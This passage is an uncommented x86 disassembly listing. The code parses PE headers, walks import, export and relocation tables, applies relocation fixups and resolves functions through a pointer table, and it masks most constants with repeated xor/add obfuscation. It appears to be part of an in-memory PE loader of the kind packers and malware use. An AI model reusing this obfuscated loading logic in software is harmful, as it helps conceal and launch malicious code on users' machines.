  42133a:	shr    edx,0xc
  42133d:	add    edx,0xffcd8d06
  421343:	xor    edx,esi
  421345:	cmp    edx,0xf89c85ba
  42134b:	jne    0x42136c
  42134d:	mov    edx,DWORD PTR [ebp-0x28]
  421350:	add    edx,DWORD PTR [ebp+0x1c]
  421353:	mov    ebx,DWORD PTR [eax]
  421355:	cmp    DWORD PTR [ebx+edx*1],0x0
  421359:	je     0x421369
  42135b:	mov    ecx,DWORD PTR [ebp+0xc]
  42135e:	add    ecx,DWORD PTR [ebx+edx*1]
  421361:	mov    ebx,DWORD PTR [eax]
  421363:	mov    DWORD PTR [edx+ebx*1],ecx
  421366:	mov    ecx,DWORD PTR [ebp-0x2c]
  421369:	mov    ebx,DWORD PTR [ebp-0x14]
  42136c:	add    DWORD PTR [ebp-0x4],0x2
  421370:	dec    DWORD PTR [ebp-0x18]
  421373:	jne    0x421325
  421375:	mov    edx,DWORD PTR [ebp-0xc]
  421378:	add    DWORD PTR [ebp-0x8],edx
  42137b:	mov    edx,DWORD PTR [ebp-0x8]
  42137e:	cmp    edx,DWORD PTR [ecx+0xa4]
  421384:	jae    0x421397
  421386:	add    eax,DWORD PTR [ebp-0xc]
  421389:	mov    edx,DWORD PTR [eax+0x4]
  42138c:	mov    DWORD PTR [ebp-0xc],edx
  42138f:	test   edx,edx
  421391:	jne    0x42130f
  421397:	mov    eax,DWORD PTR [ebp-0x10]
  42139a:	mov    DWORD PTR [ebp-0x6c],eax
  42139d:	mov    DWORD PTR [ebp-0x70],0x4
  4213a4:	mov    eax,DWORD PTR [ecx+0x50]
  4213a7:	mov    DWORD PTR [ebp-0x68],eax
  4213aa:	mov    eax,DWORD PTR [ebp-0x1c]
  4213ad:	xor    eax,esi
  4213af:	add    eax,edi
  4213b1:	mov    DWORD PTR [ebp-0x64],eax
  4213b4:	lea    eax,[ebp-0x20]
  4213b7:	mov    DWORD PTR [ebp-0x60],eax
  4213ba:	lea    eax,[ebp-0x70]
  4213bd:	push   eax
  4213be:	mov    eax,DWORD PTR [ebp+0x8]
  4213c1:	xor    eax,esi
  4213c3:	add    eax,edi
  4213c5:	push   eax
  4213c6:	mov    eax,DWORD PTR [ebp+0x20]
  4213c9:	add    eax,0xee
  4213ce:	push   eax
  4213cf:	mov    eax,DWORD PTR [ebp+0x20]
  4213d2:	mov    eax,DWORD PTR [eax+0x198]
  4213d8:	push   DWORD PTR [eax]
  4213da:	mov    eax,DWORD PTR [ebp+0x10]
  4213dd:	call   eax
  4213df:	mov    eax,DWORD PTR [ebp+0x20]
  4213e2:	mov    eax,DWORD PTR [eax+0x180]
  4213e8:	add    eax,DWORD PTR [ebp+0xc]
  4213eb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213ee:	push   DWORD PTR [ebp+0x18]
  4213f1:	mov    DWORD PTR [eax],ecx
  4213f3:	push   DWORD PTR [ebp+0x14]
  4213f6:	push   DWORD PTR [ebp+0x1c]
  4213f9:	call   ebx
  4213fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4213fe:	add    ecx,DWORD PTR [ebp+0x20]
  421401:	lea    eax,[ebp+0x4]
  421404:	mov    DWORD PTR [ebp+0x20],ecx
  421407:	mov    ecx,DWORD PTR [ebp+0x20]
  42140a:	mov    ecx,DWORD PTR [ebp+0x20]
  42140d:	mov    edx,DWORD PTR [ecx+0x190]
  421413:	mov    ecx,DWORD PTR [ebp+0x20]
  421416:	mov    ecx,DWORD PTR [ecx+0x18c]
  42141c:	mov    esi,DWORD PTR [ecx]
  42141e:	cmp    DWORD PTR [eax],esi
  421420:	jb     0x421441
  421422:	mov    esi,DWORD PTR [edx]
  421424:	mov    edi,DWORD PTR [edx]
  421426:	mov    esi,DWORD PTR [esi+0x3c]
  421429:	lea    esi,[edi+esi*1+0x50]
  42142d:	mov    edi,DWORD PTR [ecx]
  42142f:	add    edi,DWORD PTR [esi]
  421431:	cmp    DWORD PTR [eax],edi
  421433:	jae    0x421441
  421435:	mov    esi,DWORD PTR [ecx]
  421437:	mov    ecx,DWORD PTR [eax]
  421439:	mov    edx,DWORD PTR [edx]
  42143b:	sub    ecx,esi
  42143d:	add    edx,ecx
  42143f:	mov    DWORD PTR [eax],edx
  421441:	mov    eax,DWORD PTR [ebp+0xc]
  421444:	jmp    0x421448
  421446:	xor    eax,eax
  421448:	pop    edi
  421449:	pop    esi
  42144a:	pop    ebx
  42144b:	leave  
  42144c:	ret    0x1c
  42144f:	push   ebp
  421450:	mov    ebp,esp
  421452:	sub    esp,0x1c
  421455:	push   esi
  421456:	mov    esi,eax
  421458:	mov    eax,DWORD PTR [ecx+0x190]
  42145e:	cmp    DWORD PTR [eax],0x0
  421461:	je     0x421571
  421467:	test   edx,edx
  421469:	je     0x421571
  42146f:	test   esi,esi
  421471:	je     0x421571
  421477:	mov    eax,DWORD PTR [esi+0x88]
  42147d:	test   eax,eax
  42147f:	je     0x42156c
  421485:	cmp    DWORD PTR [esi+0x8c],0x10
  42148c:	je     0x42156c
  421492:	cmp    DWORD PTR [esi+0x34],edx
  421495:	je     0x42156c
  42149b:	mov    esi,DWORD PTR [ecx+0x18c]
  4214a1:	and    DWORD PTR [ebp-0x10],0x0
  4214a5:	mov    ecx,edx
  4214a7:	sub    ecx,DWORD PTR [esi]
  4214a9:	add    eax,edx
  4214ab:	movzx  edx,WORD PTR [eax+0xc]
  4214af:	mov    DWORD PTR [ebp-0x1c],ecx
  4214b2:	movzx  ecx,WORD PTR [eax+0xe]
  4214b6:	add    ecx,edx
  4214b8:	je     0x42156c
  4214be:	lea    ecx,[eax+0x14]
  4214c1:	push   ebx
  4214c2:	mov    DWORD PTR [ebp-0x18],ecx
  4214c5:	mov    esi,0x7fffffff
  4214ca:	push   edi
  4214cb:	test   DWORD PTR [ecx],esi
  4214cd:	je     0x42154e
  4214cf:	mov    edx,DWORD PTR [ecx]
  4214d1:	and    DWORD PTR [ebp-0xc],0x0
  4214d5:	and    edx,esi
  4214d7:	add    edx,eax
  4214d9:	movzx  edi,WORD PTR [edx+0xe]
  4214dd:	movzx  ebx,WORD PTR [edx+0xc]
  4214e1:	add    edi,ebx
  4214e3:	je     0x42154e
  4214e5:	lea    ecx,[edx+0x14]
  4214e8:	mov    DWORD PTR [ebp-0x14],ecx
  4214eb:	test   DWORD PTR [ecx],esi
  4214ed:	je     0x421530
  4214ef:	mov    ecx,DWORD PTR [ecx]
  4214f1:	and    DWORD PTR [ebp-0x8],0x0
  4214f5:	and    ecx,esi
  4214f7:	add    ecx,eax
  4214f9:	movzx  edi,WORD PTR [ecx+0xe]
  4214fd:	movzx  ebx,WORD PTR [ecx+0xc]
  421501:	add    edi,ebx
  421503:	je     0x421530
  421505:	lea    edi,[ecx+0x14]
  421508:	mov    DWORD PTR [ebp-0x4],edi
  42150b:	mov    edi,DWORD PTR [ebp-0x4]
  42150e:	mov    edi,DWORD PTR [edi]
  421510:	test   edi,edi
  421512:	je     0x42151a
  421514:	mov    ebx,DWORD PTR [ebp-0x1c]
  421517:	add    DWORD PTR [edi+eax*1],ebx
  42151a:	movzx  edi,WORD PTR [ecx+0xe]
  42151e:	movzx  ebx,WORD PTR [ecx+0xc]
  421522:	inc    DWORD PTR [ebp-0x8]
  421525:	add    DWORD PTR [ebp-0x4],0x8
  421529:	add    edi,ebx
  42152b:	cmp    DWORD PTR [ebp-0x8],edi
  42152e:	jb     0x42150b
  421530:	movzx  edi,WORD PTR [edx+0xe]
  421534:	movzx  ebx,WORD PTR [edx+0xc]
  421538:	mov    ecx,DWORD PTR [ebp-0x14]
  42153b:	inc    DWORD PTR [ebp-0xc]
  42153e:	add    ecx,0x8
  421541:	add    edi,ebx
  421543:	mov    DWORD PTR [ebp-0x14],ecx
  421546:	cmp    DWORD PTR [ebp-0xc],edi
  421549:	jb     0x4214eb
  42154b:	mov    ecx,DWORD PTR [ebp-0x18]
  42154e:	movzx  edx,WORD PTR [eax+0xe]
  421552:	movzx  edi,WORD PTR [eax+0xc]
  421556:	inc    DWORD PTR [ebp-0x10]
  421559:	add    ecx,0x8
  42155c:	add    edx,edi
  42155e:	mov    DWORD PTR [ebp-0x18],ecx
  421561:	cmp    DWORD PTR [ebp-0x10],edx
  421564:	jb     0x4214cb
  42156a:	pop    edi
  42156b:	pop    ebx
  42156c:	xor    eax,eax
  42156e:	inc    eax
  42156f:	jmp    0x421573
  421571:	xor    eax,eax
  421573:	pop    esi
  421574:	leave  
  421575:	ret    
  421576:	push   ebp
  421577:	mov    ebp,esp
  421579:	mov    ecx,DWORD PTR [ecx+0x190]
  42157f:	mov    eax,DWORD PTR [ebp+0xc]
  421582:	sub    esp,0x10
  421585:	push   ebx
  421586:	xor    ebx,ebx
  421588:	push   esi
  421589:	push   edi
  42158a:	cmp    DWORD PTR [ecx],ebx
  42158c:	je     0x421614
  421592:	cmp    eax,ebx
  421594:	je     0x421614
  421596:	cmp    DWORD PTR [eax+0x78],ebx
  421599:	jne    0x4215a0
  42159b:	xor    eax,eax
  42159d:	inc    eax
  42159e:	jmp    0x421616
  4215a0:	mov    eax,DWORD PTR [eax+0x78]
  4215a3:	add    eax,DWORD PTR [ebp+0x8]
  4215a6:	mov    ecx,DWORD PTR [eax+0x1c]
  4215a9:	mov    edx,DWORD PTR [eax+0x24]
  4215ac:	mov    esi,DWORD PTR [eax+0x14]
  4215af:	mov    edi,DWORD PTR [eax+0x18]
  4215b2:	add    ecx,DWORD PTR [ebp+0x8]
  4215b5:	add    edx,DWORD PTR [ebp+0x8]
  4215b8:	mov    DWORD PTR [ebp-0x4],esi
  4215bb:	cmp    esi,edi
  4215bd:	ja     0x4215c2
  4215bf:	mov    DWORD PTR [ebp-0x4],edi
  4215c2:	mov    DWORD PTR [ebp-0x8],ebx
  4215c5:	cmp    DWORD PTR [ebp-0x4],ebx
  4215c8:	jbe    0x42159b
  4215ca:	cmp    ebx,DWORD PTR [eax+0x14]
  4215cd:	jae    0x4215d5
  4215cf:	movzx  esi,WORD PTR [edx+ebx*2]
  4215d3:	jmp    0x4215d7
  4215d5:	mov    esi,ebx
  4215d7:	lea    esi,[ecx+esi*4]
  4215da:	mov    edi,DWORD PTR [esi]
  4215dc:	test   edi,edi
  4215de:	je     0x421609
  4215e0:	add    edi,DWORD PTR [ebp+0x8]
  4215e3:	mov    DWORD PTR [ebp-0x10],edi
  4215e6:	cmp    edi,eax
  4215e8:	jbe    0x4215fa
  4215ea:	mov    ebx,DWORD PTR [ebp+0xc]
  4215ed:	mov    ebx,DWORD PTR [ebx+0x7c]
  4215f0:	add    ebx,eax
  4215f2:	cmp    edi,ebx
  4215f4:	jae    0x4215fa
  4215f6:	mov    esi,DWORD PTR [esi]
  4215f8:	jmp    0x421602
  4215fa:	sub    edi,DWORD PTR [ebp+0x8]
  4215fd:	mov    DWORD PTR [esi],edi
  4215ff:	mov    esi,DWORD PTR [ebp-0x10]
  421602:	test   esi,esi
  421604:	je     0x421614
  421606:	mov    ebx,DWORD PTR [ebp-0x8]
  421609:	inc    ebx
  42160a:	mov    DWORD PTR [ebp-0x8],ebx
  42160d:	cmp    ebx,DWORD PTR [ebp-0x4]
  421610:	jb     0x4215ca
  421612:	jmp    0x42159b
  421614:	xor    eax,eax
  421616:	pop    edi
  421617:	pop    esi
  421618:	pop    ebx
  421619:	leave  
  42161a:	ret    0x8
  42161d:	push   ebp
  42161e:	mov    ebp,esp
  421620:	sub    esp,0x2c
  421623:	mov    edx,0xf89c85b5
  421628:	mov    DWORD PTR [ebp-0x4],edx
  42162b:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  421632:	mov    eax,DWORD PTR [ebp-0x4]
  421635:	mov    ecx,DWORD PTR [ebp-0x4]
  421638:	mov    ecx,DWORD PTR [ebp-0x4]
  42163b:	mov    ecx,DWORD PTR [ebp-0x4]
  42163e:	mov    ecx,DWORD PTR [ebp-0x4]
  421641:	mov    ecx,DWORD PTR [ebp-0x4]
  421644:	push   ebx
  421645:	mov    ebx,DWORD PTR [ebp+0x10]
  421648:	push   esi
  421649:	mov    esi,0x75108b3
  42164e:	mov    DWORD PTR [ebp-0x10],0x352ebcf
  421655:	mov    ecx,DWORD PTR [ebp-0x4]
  421658:	mov    ebx,DWORD PTR [ebx+0x190]
  42165e:	push   edi
  42165f:	mov    edi,0x3272fa
  421664:	xor    ecx,esi
  421666:	xor    eax,esi
  421668:	add    eax,edi
  42166a:	add    ecx,edi
  42166c:	mov    DWORD PTR [ebp-0x18],eax
  42166f:	cmp    ecx,DWORD PTR [ebx]
  421671:	je     0x4218f2
  421677:	mov    ebx,DWORD PTR [ebp-0x4]
  42167a:	mov    ecx,DWORD PTR [ebp+0xc]
  42167d:	xor    ebx,esi
  42167f:	add    ebx,edi
  421681:	cmp    ebx,ecx
  421683:	je     0x4218f2
  421689:	mov    ebx,DWORD PTR [ebp-0x4]
  42168c:	mov    ecx,DWORD PTR [ecx+0x80]
  421692:	xor    ebx,esi
  421694:	add    ebx,edi
  421696:	cmp    ecx,ebx
  421698:	je     0x4218ed
  42169e:	add    ecx,DWORD PTR [ebp+0x8]
  4216a1:	mov    DWORD PTR [ebp-0x2c],ecx
  4216a4:	mov    ebx,edx
  4216a6:	xor    ebx,esi
  4216a8:	add    ebx,edi
  4216aa:	mov    DWORD PTR [ebp-0x10],ebx
  4216ad:	mov    ebx,DWORD PTR [ebp-0x10]
  4216b0:	cmp    ebx,edx
  4216b2:	je     0x4216c6
  4216b4:	mov    edx,DWORD PTR [ebp-0x10]
  4216b7:	mov    ebx,DWORD PTR [ebp-0x4]
  4216ba:	imul   edx,edx,0x14
  4216bd:	xor    ebx,esi
  4216bf:	add    ebx,edi
  4216c1:	cmp    DWORD PTR [edx+ecx*1],ebx
  4216c4:	jne    0x4216dd
  4216c6:	mov    edx,DWORD PTR [ebp-0x10]
  4216c9:	mov    ebx,DWORD PTR [ebp-0x4]
  4216cc:	imul   edx,edx,0x14
  4216cf:	xor    ebx,esi
  4216d1:	add    ebx,edi
  4216d3:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4216d7:	je     0x4218df
  4216dd:	mov    eax,DWORD PTR [ebp-0x4]
  4216e0:	mov    ebx,DWORD PTR [ebp-0x4]
  4216e3:	mov    eax,DWORD PTR [ebp-0x10]
  4216e6:	imul   eax,eax,0x14
  4216e9:	add    eax,ecx
  4216eb:	mov    ecx,DWORD PTR [eax+0x10]
  4216ee:	add    ecx,DWORD PTR [ebp+0x8]
  4216f1:	xor    ebx,esi
  4216f3:	mov    DWORD PTR [ebp-0x1c],ecx
  4216f6:	mov    ecx,DWORD PTR [ebp-0x4]
  4216f9:	mov    edx,DWORD PTR [ebp-0x4]
  4216fc:	xor    ecx,esi
  4216fe:	add    ecx,edi
  421700:	xor    edx,esi
  421702:	mov    DWORD PTR [ebp-0x24],ecx
  421705:	mov    ecx,DWORD PTR [eax]
  421707:	add    edx,edi
  421709:	add    ebx,edi
  42170b:	cmp    ecx,edx
  42170d:	je     0x421715
  42170f:	add    ecx,DWORD PTR [ebp+0x8]
  421712:	mov    DWORD PTR [ebp-0x24],ecx
  421715:	mov    ecx,DWORD PTR [ebp-0x4]
  421718:	xor    ecx,esi
  42171a:	add    ecx,DWORD PTR [eax+0xc]
  42171d:	mov    eax,DWORD PTR [ebp+0x8]
  421720:	lea    eax,[ecx+eax*1+0x3272fa]
  421727:	mov    DWORD PTR [ebp+0xc],eax
  42172a:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  421731:	mov    eax,DWORD PTR [ebp+0x10]
  421734:	push   DWORD PTR [ebp+0xc]
  421737:	mov    eax,DWORD PTR [eax+0x1e0]
  42173d:	call   DWORD PTR [eax]
  42173f:	mov    ecx,DWORD PTR [ebp-0x4]
  421742:	xor    ecx,esi
  421744:	add    ecx,edi
  421746:	mov    DWORD PTR [ebp-0xc],eax
  421749:	cmp    ecx,eax
  42174b:	jne    0x42175f
  42174d:	mov    eax,DWORD PTR [ebp+0x10]
  421750:	push   DWORD PTR [ebp+0xc]
  421753:	mov    eax,DWORD PTR [eax+0x1e0]
  421759:	call   DWORD PTR [eax+0xc]
  42175c:	mov    DWORD PTR [ebp-0xc],eax
  42175f:	mov    DWORD PTR [ebp-0x20],0x7f661bcc
  421766:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  42176d:	mov    eax,DWORD PTR [ebp-0x4]
  421770:	xor    eax,esi
  421772:	add    eax,edi
  421774:	cmp    eax,DWORD PTR [ebp-0xc]
  421777:	jne    0x42179c
  421779:	mov    eax,DWORD PTR [ebp-0x8]
  42177c:	mov    ecx,DWORD PTR [ebp-0x20]
  42177f:	xor    eax,esi
  421781:	xor    ecx,esi
  421783:	lea    ebx,[ebx+eax*1+0x3272fa]
  42178a:	mov    eax,DWORD PTR [ebp+0x10]
  42178d:	mov    eax,DWORD PTR [eax+0x1e0]
  421793:	add    ecx,edi
  421795:	imul   ecx,ebx
  421798:	push   ecx
  421799:	call   DWORD PTR [eax+0x24]
  42179c:	mov    eax,DWORD PTR [ebp-0x4]
  42179f:	xor    eax,esi
  4217a1:	add    eax,edi
  4217a3:	cmp    eax,DWORD PTR [ebp-0xc]
  4217a6:	jne    0x4217b7
  4217a8:	mov    eax,DWORD PTR [ebp-0x28]
  4217ab:	xor    eax,esi
  4217ad:	add    eax,edi
  4217af:	cmp    ebx,eax
  4217b1:	jbe    0x421731
  4217b7:	mov    eax,DWORD PTR [ebp-0x4]
  4217ba:	xor    eax,esi
  4217bc:	add    eax,edi
  4217be:	cmp    eax,DWORD PTR [ebp-0xc]
  4217c1:	jne    0x4217da
  4217c3:	mov    eax,DWORD PTR [ebp-0x8]
  4217c6:	mov    ecx,DWORD PTR [ebp-0x18]
  4217c9:	xor    eax,esi
  4217cb:	lea    eax,[ecx+eax*1+0x3272fa]
  4217d2:	mov    DWORD PTR [ebp-0x18],eax
  4217d5:	jmp    0x4218c9
  4217da:	mov    DWORD PTR [ebp-0x14],0x1121bcd
  4217e1:	mov    DWORD PTR [ebp+0xc],0xe042dcf
  4217e8:	mov    ebx,DWORD PTR [ebp-0x4]
  4217eb:	xor    ebx,esi
  4217ed:	add    ebx,edi
  4217ef:	jmp    0x4218b6
  4217f4:	mov    eax,DWORD PTR [ebp-0x4]
  4217f7:	xor    eax,esi
  4217f9:	add    eax,edi
  4217fb:	mov    DWORD PTR [ebp-0x14],eax
  4217fe:	mov    eax,DWORD PTR [ebp-0x4]
  421801:	xor    eax,esi
  421803:	add    eax,edi
  421805:	mov    DWORD PTR [ebp+0xc],eax
  421808:	mov    ecx,DWORD PTR [ebp-0x4]
  42180b:	mov    eax,DWORD PTR [ebp-0x24]
  42180e:	xor    ecx,esi
  421810:	add    ecx,edi
  421812:	cmp    ecx,eax
  421814:	je     0x42181c
  421816:	mov    eax,DWORD PTR [eax+ebx*4]
  421819:	mov    DWORD PTR [ebp-0x14],eax
  42181c:	mov    eax,DWORD PTR [ebp-0x1c]
  42181f:	mov    eax,DWORD PTR [eax+ebx*4]
  421822:	mov    DWORD PTR [ebp+0xc],eax
  421825:	mov    eax,DWORD PTR [ebp-0x4]
  421828:	mov    ecx,DWORD PTR [ebp-0x14]
  42182b:	xor    eax,esi
  42182d:	add    eax,edi
  42182f:	cmp    eax,ecx
  421831:	je     0x42185c
  421833:	mov    eax,DWORD PTR [ebp-0x4]
  421836:	mov    ecx,DWORD PTR [ebp-0x14]
  421839:	xor    eax,esi
  42183b:	add    eax,edi
  42183d:	shr    ecx,0x1f
  421840:	cmp    eax,ecx
  421842:	je     0x42185c
  421844:	mov    ecx,DWORD PTR [ebp-0x14]
  421847:	mov    eax,DWORD PTR [ebp+0x10]
  42184a:	mov    eax,DWORD PTR [eax+0x1e0]
  421850:	movzx  ecx,cx
  421853:	push   ecx
  421854:	push   DWORD PTR [ebp-0xc]
  421857:	call   DWORD PTR [eax+0x8]
  42185a:	jmp    0x421875
  42185c:	mov    eax,DWORD PTR [ebp+0xc]
  42185f:	add    eax,DWORD PTR [ebp+0x8]
  421862:	mov    ecx,DWORD PTR [ebp+0x10]
  421865:	mov    ecx,DWORD PTR [ecx+0x1e0]
  42186b:	add    eax,0x2
  42186e:	push   eax
  42186f:	push   DWORD PTR [ebp-0xc]
  421872:	call   DWORD PTR [ecx+0x8]
  421875:	mov    DWORD PTR [ebp+0xc],eax
  421878:	mov    eax,DWORD PTR [ebp-0x4]
  42187b:	mov    ecx,DWORD PTR [ebp+0xc]
  42187e:	xor    eax,esi
  421880:	add    eax,edi
  421882:	cmp    eax,ecx
  421884:	mov    eax,DWORD PTR [ebp-0x8]
  421887:	jne    0x42189a
  421889:	mov    ecx,DWORD PTR [ebp-0x18]
  42188c:	xor    eax,esi
  42188e:	lea    eax,[ecx+eax*1+0x3272fa]
  421895:	mov    DWORD PTR [ebp-0x18],eax
  421898:	jmp    0x4218aa
  42189a:	mov    ecx,DWORD PTR [ebp+0xc]
  42189d:	xor    eax,esi
  42189f:	add    eax,edi
  4218a1:	imul   eax,ecx
  4218a4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218a7:	mov    DWORD PTR [ecx+ebx*4],eax
  4218aa:	mov    eax,DWORD PTR [ebp-0x8]
  4218ad:	xor    eax,esi
  4218af:	lea    ebx,[ebx+eax*1+0x3272fa]
  4218b6:	mov    eax,DWORD PTR [ebp-0x4]
  4218b9:	mov    ecx,DWORD PTR [ebp-0x1c]
  4218bc:	xor    eax,esi
  4218be:	add    eax,edi
  4218c0:	cmp    DWORD PTR [ecx+ebx*4],eax
  4218c3:	jne    0x4217f4
  4218c9:	mov    edx,DWORD PTR [ebp-0x10]
  4218cc:	mov    eax,DWORD PTR [ebp-0x18]
  4218cf:	mov    ecx,DWORD PTR [ebp-0x2c]
  4218d2:	sub    edx,0x3272f9
  4218d8:	xor    edx,esi
  4218da:	jmp    0x4216a4
  4218df:	mov    ecx,DWORD PTR [ebp-0x4]
  4218e2:	xor    ecx,esi
  4218e4:	add    ecx,edi
  4218e6:	cmp    eax,ecx
  4218e8:	mov    eax,DWORD PTR [ebp-0x4]
  4218eb:	jne    0x4218f5
  4218ed:	mov    eax,DWORD PTR [ebp-0x8]
  4218f0:	jmp    0x4218f5
  4218f2:	mov    eax,DWORD PTR [ebp-0x4]
  4218f5:	xor    eax,esi
  4218f7:	add    eax,edi
  4218f9:	pop    edi
  4218fa:	pop    esi
  4218fb:	pop    ebx
  4218fc:	leave  
  4218fd:	ret    0xc
  421900:	push   ebp
  421901:	mov    ebp,esp
  421903:	sub    esp,0x28
  421906:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  42190d:	mov    DWORD PTR [ebp-0x28],0xf89c85b4
  421914:	mov    eax,DWORD PTR [ebp+0xc]
  421917:	mov    DWORD PTR [ebp+0xc],eax
  42191a:	push   esi
  42191b:	mov    eax,eax
  42191d:	mov    eax,DWORD PTR [ebp-0x4]
  421920:	mov    esi,DWORD PTR [ebp+0x8]
  421923:	mov    ecx,0x75108b3
  421928:	xor    eax,ecx
  42192a:	mov    edx,0x3272fa
  42192f:	add    eax,edx
  421931:	cmp    esi,eax
  421933:	je     0x421a5a
  421939:	mov    eax,DWORD PTR [ebp+0x8]
  42193c:	mov    esi,DWORD PTR [ebp+0x8]
  42193f:	add    esi,DWORD PTR [eax+0x3c]
  421942:	push   edi
  421943:	mov    DWORD PTR [ebp+0xc],esi
  421946:	mov    DWORD PTR [ebp-0x1c],0xf89c85b8
  42194d:	mov    eax,DWORD PTR [ebp-0x1c]
  421950:	mov    esi,DWORD PTR [ebp-0x4]
  421953:	mov    edi,DWORD PTR [ebp+0xc]
  421956:	xor    esi,ecx
  421958:	xor    eax,ecx
  42195a:	add    esi,edx
  42195c:	cmp    DWORD PTR [edi+eax*8+0x1939848],esi
  421963:	je     0x421a54
  421969:	mov    esi,DWORD PTR [ebp+0xc]
  42196c:	mov    eax,DWORD PTR [ebp+0x8]
  42196f:	add    eax,DWORD PTR [esi+0xa0]
  421975:	mov    esi,DWORD PTR [ebp+0x8]
  421978:	mov    edi,DWORD PTR [ebp+0xc]
  42197b:	sub    esi,DWORD PTR [edi+0x34]
  42197e:	mov    edi,DWORD PTR [ebp-0x4]
  421981:	xor    edi,ecx
  421983:	add    edi,edx
  421985:	mov    DWORD PTR [ebp-0x24],esi
  421988:	cmp    esi,edi
  42198a:	je     0x421a54
  421990:	mov    esi,DWORD PTR [ebp-0x4]
  421993:	xor    esi,ecx
  421995:	add    esi,edx
  421997:	mov    DWORD PTR [ebp-0x8],esi
  42199a:	push   ebx
  42199b:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4219a2:	jmp    0x421a3e
  4219a7:	mov    esi,DWORD PTR [ebp-0x4]
  4219aa:	xor    esi,ecx
  4219ac:	lea    edi,[ebx-0x8]
  4219af:	add    esi,edx
  4219b1:	shr    edi,1
  4219b3:	cmp    esi,edi
  4219b5:	jae    0x421a24
  4219b7:	sub    edi,esi
  4219b9:	lea    ebx,[eax+esi*2+0x8]
  4219bd:	mov    DWORD PTR [ebp-0x18],edi
  4219c0:	movzx  esi,WORD PTR [ebx]
  4219c3:	and    esi,0xfff
  4219c9:	mov    DWORD PTR [ebp-0x14],esi
  4219cc:	mov    edi,DWORD PTR [ebp-0x14]
  4219cf:	mov    esi,DWORD PTR [eax]
  4219d1:	sub    esi,edx
  4219d3:	add    edi,esi
  4219d5:	movzx  esi,WORD PTR [ebx]
  4219d8:	shr    esi,0xc
  4219db:	xor    edi,ecx
  4219dd:	mov    DWORD PTR [ebp-0x20],edi
  4219e0:	mov    DWORD PTR [ebp-0x14],esi
  4219e3:	mov    esi,DWORD PTR [ebp-0x20]
  4219e6:	mov    edi,DWORD PTR [ebp+0x8]
  4219e9:	xor    esi,ecx
  4219eb:	lea    esi,[esi+edi*1+0x3272fa]
  4219f2:	mov    DWORD PTR [ebp-0x20],esi
  4219f5:	mov    esi,DWORD PTR [ebp-0x10]
  4219f8:	mov    edi,DWORD PTR [ebp-0x14]
  4219fb:	xor    esi,ecx
  4219fd:	add    esi,edx
  4219ff:	cmp    edi,esi
  421a01:	jne    0x421a19
  421a03:	mov    esi,DWORD PTR [ebp-0x10]
  421a06:	mov    edi,DWORD PTR [ebp-0x14]
  421a09:	xor    esi,ecx
  421a0b:	add    esi,edx
  421a0d:	cmp    edi,esi
  421a0f:	jne    0x421a19
  421a11:	mov    esi,DWORD PTR [ebp-0x20]
  421a14:	mov    edi,DWORD PTR [ebp-0x24]
  421a17:	add    DWORD PTR [esi],edi
  421a19:	add    ebx,0x2
  421a1c:	dec    DWORD PTR [ebp-0x18]
  421a1f:	jne    0x4219c0
  421a21:	mov    ebx,DWORD PTR [ebp-0xc]
  421a24:	add    DWORD PTR [ebp-0x8],ebx
  421a27:	mov    esi,DWORD PTR [ebp-0x1c]
  421a2a:	mov    edi,DWORD PTR [ebp-0x8]
  421a2d:	mov    ebx,DWORD PTR [ebp+0xc]
  421a30:	xor    esi,ecx
  421a32:	cmp    edi,DWORD PTR [ebx+esi*8+0x193984c]
  421a39:	jae    0x421a53
  421a3b:	add    eax,DWORD PTR [ebp-0xc]
  421a3e:	mov    esi,DWORD PTR [ebp-0x4]
  421a41:	mov    ebx,DWORD PTR [eax+0x4]
  421a44:	xor    esi,ecx
  421a46:	add    esi,edx
  421a48:	mov    DWORD PTR [ebp-0xc],ebx
  421a4b:	cmp    ebx,esi
  421a4d:	jne    0x4219a7
  421a53:	pop    ebx
  421a54:	mov    eax,DWORD PTR [ebp-0x28]
  421a57:	pop    edi
  421a58:	jmp    0x421a5d
  421a5a:	mov    eax,DWORD PTR [ebp-0x4]
  421a5d:	xor    eax,ecx
  421a5f:	add    eax,edx
  421a61:	pop    esi
  421a62:	leave  
  421a63:	ret    0x8
  421a66:	push   ebp
  421a67:	mov    ebp,esp
  421a69:	sub    esp,0xd8
  421a6f:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  421a76:	mov    DWORD PTR [ebp-0x24],0xf89c85b4
  421a7d:	mov    eax,DWORD PTR [ebp-0x4]
  421a80:	push   ebx
  421a81:	push   esi
  421a82:	mov    esi,0x75108b3
  421a87:	xor    eax,esi
  421a89:	push   edi
  421a8a:	mov    edi,0x3272fa
  421a8f:	add    eax,edi
  421a91:	mov    DWORD PTR [ebp-0x18],eax
  421a94:	mov    eax,DWORD PTR [ebp-0x4]
  421a97:	xor    eax,esi
  421a99:	add    eax,edi
  421a9b:	mov    DWORD PTR [ebp-0x8],eax
  421a9e:	mov    ebx,DWORD PTR [ebp+0x20]
  421aa1:	mov    eax,DWORD PTR [ebp-0x1c]
  421aa4:	mov    ecx,DWORD PTR [ebp-0x1c]
  421aa7:	xor    eax,ecx
  421aa9:	mov    DWORD PTR [ebp-0x1c],eax
  421aac:	add    DWORD PTR [ebp-0x1c],0xf89cb5b5
  421ab3:	mov    eax,DWORD PTR [ebp-0xc]
  421ab6:	mov    ecx,DWORD PTR [ebp-0xc]
  421ab9:	xor    eax,ecx
  421abb:	mov    DWORD PTR [ebp-0xc],eax
  421abe:	add    DWORD PTR [ebp-0xc],0xf89c85f5
  421ac5:	mov    eax,DWORD PTR [ebp-0x10]
  421ac8:	mov    ecx,DWORD PTR [ebp-0x10]
  421acb:	xor    eax,ecx
  421acd:	mov    DWORD PTR [ebp-0x10],eax
  421ad0:	add    DWORD PTR [ebp-0x10],0xf89c85b9
  421ad7:	mov    eax,DWORD PTR [ebp-0x28]
  421ada:	mov    ecx,DWORD PTR [ebp-0x28]
  421add:	xor    eax,ecx
  421adf:	mov    DWORD PTR [ebp-0x28],eax
  421ae2:	add    DWORD PTR [ebp-0x28],0xf89f05b5
  421ae9:	mov    DWORD PTR [ebp+0x20],0xf89cefe0
  421af0:	mov    eax,DWORD PTR [ebp+0x8]
